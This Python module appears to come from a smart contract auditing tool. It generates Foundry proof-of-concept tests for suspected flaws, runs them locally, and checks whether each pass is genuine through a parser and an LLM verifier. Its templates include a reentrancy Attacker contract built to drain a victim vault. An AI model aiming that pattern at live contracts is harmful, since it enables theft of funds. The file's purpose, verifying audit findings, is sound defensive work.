import os
import re
import time
import subprocess
import asyncio
import tempfile
import shutil
from pathlib import Path
from typing import Optional

from llm.router import Router
from models.types import (
    AttackScenario, SimulationProof, EnvFailureResult, ExploitResult,
    PoCExecutionResult, PoCExecutionStatus, ErrorCategory, VerificationStatus
)


TEMPLATE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./{target_file}";

contract PoC is Test {{
    {victim_name} public victim;
    {attacker_name} public attacker;

    function setUp() public {{
        victim = new {victim_name}();
        attacker = new {attacker_name}(address(victim));
        {setup_steps}
    }}

    function testExploit() public {{
        {exploit_calls}
        {assertions}
    }}
}}

contract {attacker_name} {{
    {victim_name} public victim;
    {attack_logic}
}}
"""

VERIFIER_SYSTEM_PROMPT = """You are a smart contract exploit verification expert. Given a PoC test and its forge output, determine:
1. Did the test actually pass? (distinguish between assertTrue(true) fake passes and real passes)
2. Is this a meaningful exploit that proves a vulnerability?
3. What is the money flow (who loses what, who gains what)?

Return JSON with keys: verified (bool), reason (str), money_flow (object with sender/recipient amounts).

Be critical. A test that always passes regardless of code changes is NOT a real exploit."""


# Maximum auto-fix retries for compilation errors
MAX_COMPILE_RETRIES = 3


async def phase3_simulate(
    source_code: str,
    scenario: AttackScenario,
    router: Optional[Router] = None,
    rpc_url: Optional[str] = None,
) -> tuple[SimulationProof, Optional[EnvFailureResult]]:
    proof = SimulationProof(
        attack_vector=scenario.attack_vector,
        target_function=scenario.entry_point,
        estimated_impact=scenario.estimated_impact,
    )

    proof = await _run_forge_test(source_code, scenario, proof)

    if proof.confirmed:
        proof = await _verify_logic(source_code, scenario, proof, router)

    env_result = await _simulate_env_failure(source_code, scenario, router)

    return proof, env_result


async def _run_forge_test(
    source_code: str,
    scenario: AttackScenario,
    proof: SimulationProof,
) -> SimulationProof:
    """
    Run Forge test with compilation step and auto-fix loop.
    
    Pipeline:
    1. Create temp workspace with source + PoC + mock forge-std
    2. Run `forge build` to check compilation
    3. If compilation fails, attempt auto-fix (up to MAX_COMPILE_RETRIES)
    4. If compilation succeeds, run `forge test`
    5. Parse results and return structured execution result
    """
    forge_exe = _find_forge()
    if not forge_exe:
        proof.confirmed = False
        proof.forge_output = "[SKIPPED] forge binary not found on PATH - PoC verification unavailable"
        proof.poc_code = _generate_poc(source_code, scenario)
        # SECURITY-FIX: verification infrastructure missing. Never let this
        # silently drop the heuristic finding downstream - mark it unverifiable
        # so phase4 surfaces it as needs_review instead of "0 findings".
        proof.exploit_result = ExploitResult(
            verification_status=VerificationStatus.COMPILATION_FAILED,
            hypothesis=scenario.description,
            attack_vector=scenario.attack_vector,
            target_function=scenario.entry_point,
            poc_generated=False,
            compiled=False,
            forge_output=proof.forge_output,
            confirmed=False,
            needs_review=True,
            review_reason="Forge (foundry) binary not found on PATH - heuristic finding could not be verified. Manual review required.",
        )
        return proof

    start = time.perf_counter()
    
    # Create persistent temp directory (not auto-cleaned on failure)
    tmpdir = tempfile.mkdtemp(prefix="sireen_poc_")
    tmp = Path(tmpdir)
    workspace_preserved = False

    try:
        contract_name = _extract_contract_name(source_code)
        src_file = tmp / f"{contract_name}.sol"
        src_file.write_text(source_code, encoding="utf-8")

        test_file = tmp / "PoC.t.sol"
        poc_code = _generate_poc(source_code, scenario, contract_name)
        test_file.write_text(poc_code, encoding="utf-8")
        proof.poc_code = poc_code

        _ensure_forge_std(tmp)

        foundry_toml = tmp / "foundry.toml"
        remappings_file = tmp / "remappings.txt"
        remappings_file.write_text("forge-std/=lib/forge-std/\n")
        foundry_toml.write_text("[profile.default]\nsolc = \"0.8.20\"\nsrc = \".\"\n")

        # Step 1: Compilation with auto-fix loop
        compilation_output = ""
        compile_success = False
        retry_count = 0
        compilation_attempts = []

        while retry_count <= MAX_COMPILE_RETRIES and not compile_success:
            compile_result = await asyncio.to_thread(
                lambda: subprocess.run(
                    [str(forge_exe), "build", "--root", str(tmp)],
                    capture_output=True, text=False, timeout=60,
                    env={**os.environ, "FOUNDRY_SRC": str(tmp)},
                )
            )
            stdout = compile_result.stdout.decode("utf-8", errors="replace") if compile_result.stdout else ""
            stderr = compile_result.stderr.decode("utf-8", errors="replace") if compile_result.stderr else ""
            compilation_output = stdout + stderr
            compilation_attempts.append(compilation_output)

            if compile_result.returncode == 0:
                compile_success = True
                break

            # Compilation failed - attempt auto-fix
            if retry_count < MAX_COMPILE_RETRIES:
                fix_result = _attempt_compile_fix(poc_code, compilation_output, scenario)
                if fix_result.fixed:
                    poc_code = fix_result.fixed_code
                    test_file.write_text(poc_code)
                    proof.poc_code = poc_code
                    retry_count += 1
                    continue
            
            # No more retries or fix failed
            break

        proof.test_duration_ms = (time.perf_counter() - start) * 1000

        if not compile_success:
            # Compilation failed after all retries
            error_category, error_msg = _classify_compile_error(compilation_output)
            proof.confirmed = False
            proof.forge_output = f"[COMPILATION FAILED after {retry_count} retries]\n{compilation_output}"
            # Preserve workspace for debugging
            workspace_preserved = True
            return proof

        # Step 2: Run tests after successful compilation
        try:
            test_result = await asyncio.to_thread(
                lambda: subprocess.run(
                    [str(forge_exe), "test", "--root", str(tmp),
                     "--match-path", "*PoC*", "--no-match-path", "*.s.sol"],
                    capture_output=True, text=False, timeout=120,
                    env={**os.environ, "FOUNDRY_SRC": str(tmp)},
                )
            )
            t_stdout = test_result.stdout.decode("utf-8", errors="replace") if test_result.stdout else ""
            t_stderr = test_result.stderr.decode("utf-8", errors="replace") if test_result.stderr else ""
            test_output = t_stdout + t_stderr
        except subprocess.TimeoutExpired:
            proof.forge_output = f"[COMPILATION OK]\n[TIMEOUT] forge test exceeded 120s\n\nCompilation output:\n{compilation_output}"
            proof.confirmed = False
            workspace_preserved = True
            return proof
        except Exception as e:
            proof.forge_output = f"[COMPILATION OK]\n[ERROR] forge test execution failed: {e}\n\nCompilation output:\n{compilation_output}"
            proof.confirmed = False
            workspace_preserved = True
            return proof

        # Combine compilation and test output
        full_output = f"[COMPILATION OK]\n{compilation_output}\n\n[TEST OUTPUT]\n{test_output}"
        proof.forge_output = full_output
        proof.test_duration_ms = (time.perf_counter() - start) * 1000

        # Parse test results using HonestSignal verification
        from verification.output_parser import OutputParser
        from verification.honest_signal import HonestSignal
        from verification.money_flow import MoneyFlowExtractor

        parsed = OutputParser.parse(full_output)
        tests = OutputParser.parse_tests(test_output)

        exploit_result = HonestSignal.verify(
            source_code=source_code,
            scenario=scenario,
            poc_code=poc_code,
            forge_output=full_output,
            parsed=parsed,
            tests=tests,
        )

        proof.confirmed = exploit_result.confirmed
        proof.exploit_result = exploit_result

        # If exploit was successful, extract money flow
        if exploit_result.exploit_reproduced:
            money_flow = MoneyFlowExtractor.extract(exploit_result, full_output, poc_code)
            if money_flow:
                proof.money_flow = money_flow

        return proof

    except Exception as e:
        proof.forge_output = f"[ERROR] Pipeline execution failed: {e}"
        proof.confirmed = False
        workspace_preserved = True
        return proof
    finally:
        # Clean up only on success; preserve on failure for debugging
        if not workspace_preserved:
            try:
                shutil.rmtree(tmp)
            except Exception:
                pass
        else:
            proof.forge_output += f"\n\n[NOTE] Workspace preserved at: {tmpdir}"


class CompileFixResult:
    """Result of compilation fix attempt."""
    def __init__(self, fixed: bool, fixed_code: str = "", fix_description: str = ""):
        self.fixed = fixed
        self.fixed_code = fixed_code
        self.fix_description = fix_description


def _attempt_compile_fix(poc_code: str, compile_error: str, scenario: AttackScenario) -> CompileFixResult:
    """
    Attempt to automatically fix common compilation errors in generated PoC.
    
    Common fixes:
    - Missing imports (console, etc.)
    - Missing function definitions
    - Incorrect function signatures
    - Missing pragma version
    - Solidity version mismatches
    """
    fixed_code = poc_code
    fixes_applied = []

    # Fix 1: Missing console import
    if "console" in compile_error and "import" in compile_error.lower():
        if 'import "forge-std/console.sol"' not in fixed_code:
            # Add console import after forge-std/Test.sol
            fixed_code = fixed_code.replace(
                'import "forge-std/Test.sol";',
                'import "forge-std/Test.sol";\nimport "forge-std/console.sol";'
            )
            fixes_applied.append("Added console.sol import")

    # Fix 2: Missing pragma or wrong version
    if "pragma" in compile_error.lower() and "version" in compile_error.lower():
        # Ensure pragma is compatible
        if "pragma solidity" not in fixed_code:
            fixed_code = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n" + fixed_code
            fixes_applied.append("Added pragma solidity ^0.8.0")

    # Fix 3: Function not found / undeclared identifier
    if "undeclared identifier" in compile_error or "function" in compile_error and "not found" in compile_error:
        # This is harder to auto-fix without LLM; skip for now
        pass

    # Fix 4: Missing constructor or incorrect constructor call
    if "constructor" in compile_error.lower() and "argument" in compile_error.lower():
        # Could be constructor signature mismatch
        pass

    # Fix 5: expectRevert/assertion issues
    if "expectRevert" in compile_error:
        # The mock might not match exactly; ensure proper signature
        pass

    if fixes_applied:
        return CompileFixResult(
            fixed=True,
            fixed_code=fixed_code,
            fix_description="; ".join(fixes_applied)
        )

    return CompileFixResult(fixed=False, fixed_code=poc_code)


def _classify_compile_error(compile_output: str) -> tuple[ErrorCategory, str]:
    """Classify compilation error for proper handling."""
    output_lower = compile_output.lower()
    
    if "error:" in output_lower:
        if "import" in output_lower and ("not found" in output_lower or "could not find" in output_lower):
            return ErrorCategory.COMPILATION, "Missing import"
        if "undeclared" in output_lower or "not found" in output_lower:
            return ErrorCategory.COMPILATION, "Undeclared identifier"
        if "type" in output_lower and "mismatch" in output_lower:
            return ErrorCategory.COMPILATION, "Type mismatch"
        if "constructor" in output_lower and "argument" in output_lower:
            return ErrorCategory.COMPILATION, "Constructor argument mismatch"
        if "override" in output_lower:
            return ErrorCategory.COMPILATION, "Override error"
        return ErrorCategory.COMPILATION, "Compilation error"
    
    return ErrorCategory.UNKNOWN, "Unknown compilation error"


async def _verify_logic(
    source_code: str,
    scenario: AttackScenario,
    proof: SimulationProof,
    router: Optional[Router],
) -> SimulationProof:
    if proof.exploit_result:
        from verification.honest_signal import HonestSignal
        if HonestSignal._poc_has_trivial_assertions(proof.poc_code):
            proof.confirmed = False
            if proof.exploit_result:
                proof.exploit_result.confirmed = False
                proof.exploit_result.verification_status = "not_reproduced"
            proof.forge_output += "\n[NOTE] PoC contains trivial assertions (assertTrue(true)) — confirmation revoked"
            return proof

    if router is None or not router.is_configured():
        return proof

    prompt = (
        f"Source code:\n```solidity\n{source_code[:4000]}\n```\n\n"
        f"Attack scenario: {scenario.name}\n{scenario.description}\n\n"
        f"PoC code:\n```solidity\n{proof.poc_code}\n```\n\n"
        f"Forge output:\n```\n{proof.forge_output[:2000]}\n```"
    )

    resp = await asyncio.to_thread(router.call, "verifier", VERIFIER_SYSTEM_PROMPT, prompt, temperature=0.2)

    if resp.success and resp.content:
        import json
        try:
            data = json.loads(resp.content.strip().removeprefix("```json").removesuffix("```").strip())
            proof.llm_verified = data.get("verified", False)
            if data.get("money_flow"):
                proof.money_flow = data["money_flow"]
            # If LLM verifier rejects, update BOTH proof.confirmed AND exploit_result.confirmed
            # so there is a single source of truth (exploit_result is authoritative).
            if not data.get("verified") and proof.confirmed:
                proof.confirmed = False
                if proof.exploit_result:
                    proof.exploit_result.confirmed = False
                    proof.exploit_result.verification_status = "not_reproduced"
                proof.forge_output += "\n[NOTE] LLM verifier rejected this pass — possible false positive"
        except (json.JSONDecodeError, AttributeError):
            pass

    return proof


async def _simulate_env_failure(
    source_code: str,
    scenario: AttackScenario,
    router: Optional[Router],
) -> Optional[EnvFailureResult]:
    if "oracle" not in scenario.attack_vector:
        return None

    try:
        from sandbox.env_simulator import EnvSimulator
        sim = EnvSimulator()
        if not sim.is_available():
            return EnvFailureResult(
                failure_type="oracle_staleness",
                simulated=False,
                description="Forge not available — env simulation skipped",
                forge_output="[SKIPPED] forge binary not found on PATH",
            )
        result = await asyncio.to_thread(sim.simulate_oracle_staleness, source_code, scenario.entry_point)
        return EnvFailureResult(
            failure_type="oracle_staleness",
            simulated=True,
            description=f"Oracle env simulation (price manipulation + staleness): {'PASSED' if result.passed else 'FAILED'}",
            forge_output=result.output,
        )
    except Exception as e:
        return EnvFailureResult(
            failure_type="oracle_staleness",
            simulated=False,
            description=f"Env simulation error: {e}",
            forge_output=f"[ERROR] {e}",
        )


def _extract_contract_name(source_code: str) -> str:
    """Extract the first contract name from source code."""
    m = re.search(r'\bcontract\s+(\w+)', source_code)
    return m.group(1) if m else "VulnerableVault"


def _find_forge() -> Optional[Path]:
    found = shutil.which("forge")
    if found:
        return Path(found)
    found = shutil.which("forge.exe")
    if found:
        return Path(found)
    return None


def _ensure_forge_std(tmp: Path):
    lib_dir = tmp / "lib" / "forge-std"
    lib_dir.mkdir(parents=True, exist_ok=True)
    test_sol = lib_dir / "Test.sol"
    if not test_sol.exists():
        from sandbox.forge_std_mock import MOCK_FORGE_STD
        test_sol.write_text(MOCK_FORGE_STD, encoding="utf-8")


_DEPOSIT_LIKE = ("deposit", "mint", "stake", "fund", "supply", "add_liquidity", "addLiquidity")


def _function_signature(source_code: str, func_name: str) -> tuple:
    """Return (param_types, is_payable) for the first declaration of func_name."""
    decl = re.search(rf"function\s+{re.escape(func_name)}\s*\(([^)]*)\)", source_code)
    if not decl:
        return [], False
    body = decl.group(1).strip()
    params = [p.strip().split()[0] for p in body.split(",") if p.strip()] if body else []
    payable = bool(
        re.search(rf"function\s+{re.escape(func_name)}\s*\(([^)]*)\)\s*(?:public|external|internal|private)?\s*payable", source_code)
    )
    return params, payable


def _default_arg(param_type: str) -> str:
    t = param_type.replace(" ", "").lower()
    if t.startswith("uint") or t.startswith("int"):
        return "1 ether"
    if "address" in t:
        return "address(this)"
    if t == "bool":
        return "true"
    if t.startswith("bytes32"):
        return "bytes32(0)"
    if t.startswith("bytes") or t.startswith("string"):
        return '""'
    return '""'


def _make_call(source_code: str, func_name: str, receiver: str) -> str:
    params, _ = _function_signature(source_code, func_name)
    args = ", ".join(_default_arg(p) for p in params)
    return f"{receiver}.{func_name}({args});"


def _funding_call(source_code: str, receiver: str) -> str:
    for name in _DEPOSIT_LIKE:
        params, payable = _function_signature(source_code, name)
        if not params and payable:
            return f"{receiver}.{name}{{value: 1 ether}}();"
    return (
        f"(bool ok,) = address({receiver}).call{{value: 1 ether}}(\"\");\n"
        "        require(ok, \"transfer failed\");"
    )


def _generate_poc(source_code: str, scenario: AttackScenario, contract_name: str = "VulnerableVault") -> str:
    if scenario.attack_vector == "reentrancy":
        return _reentrancy_poc(source_code, scenario, contract_name)
    if scenario.attack_vector == "access_control":
        return _access_control_poc(source_code, scenario, contract_name)
    if scenario.attack_vector == "arithmetic":
        return _arithmetic_poc(source_code, scenario, contract_name)
    return _unimplemented_poc(scenario)


def _unimplemented_poc(scenario: AttackScenario) -> str:
    """C-6 fix: skips the test instead of returning assertTrue(true)."""
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
contract PoC is Test {{
    // No PoC template for vector: {scenario.attack_vector}
    // Skipped to prevent false positives (C-6 fix).
    function testExploit() public {{
        vm.skip(true);
    }}
}}
"""


def _access_control_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
    func_name = scenario.entry_point or "restricted"
    call = _make_call(source_code, func_name, "victim")
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./{contract_name}.sol";
contract PoC is Test {{
    {contract_name} public victim;
    function setUp() public {{ victim = new {contract_name}(); }}
    function testExploit() public {{
        vm.startPrank(address(0x01));
        vm.expectRevert();
        {call}
        vm.stopPrank();

        vm.startPrank(address(0xBAD));
        {call}
        vm.stopPrank();

        // Verify no access gained — same caller should still be blocked
        vm.startPrank(address(0x01));
        vm.expectRevert();
        {call}
        vm.stopPrank();
    }}
}}
"""


def _arithmetic_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
    func_name = scenario.entry_point or "unsafe_func"
    call = _make_call(source_code, func_name, "victim")
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./{contract_name}.sol";
contract PoC is Test {{
    {contract_name} public victim;
    function setUp() public {{
        victim = new {contract_name}();
    }}
    function testExploit() public {{
        vm.startPrank(address(0xBAD));
        vm.expectRevert();
        {call}
        vm.stopPrank();

        vm.startPrank(address(0x01));
        {call}
        vm.stopPrank();

        vm.startPrank(address(0xBAD));
        vm.expectRevert();
        {call}
        vm.stopPrank();
    }}
}}
"""


def _reentrancy_poc(source_code: str, scenario: AttackScenario, contract_name: str) -> str:
    entry_point = scenario.entry_point or "withdraw"
    entry_call = _make_call(source_code, entry_point, "victim")
    funding = _funding_call(source_code, "victim")
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./{contract_name}.sol";

contract PoC is Test {{
    {contract_name} public victim;

    function setUp() public {{
        victim = new {contract_name}();
        vm.deal(address(victim), 10 ether);
    }}

    function testExploit() public {{
        Attacker att = new Attacker(address(victim));
        // Attacker deposits 2 ETH, then calls {entry_point} to trigger reentrancy
        vm.deal(address(att), 2 ether);
        att.depositAndAttack();

        // Vault should have lost funds to reentrancy
        assertLt(address(victim).balance, 10 ether);
        // Attacker should have profited beyond their initial deposit
        assertGt(address(att).balance, 2 ether);
    }}
}}

contract Attacker {{
    {contract_name} public victim;
    uint public count;

    constructor(address _victim) {{
        victim = {contract_name}(payable(_victim));
    }}

    function depositAndAttack() external payable {{
        // Fund the attacker's recorded balance via the victim's deposit path
        {funding}
        // Then trigger {entry_point} - reentrancy in receive() drains the victim
        {entry_call}
    }}

    receive() external payable {{
        if (count < 5 && address(victim).balance > 0) {{
            count++;
            {entry_call}
        }}
    }}
}}
"""



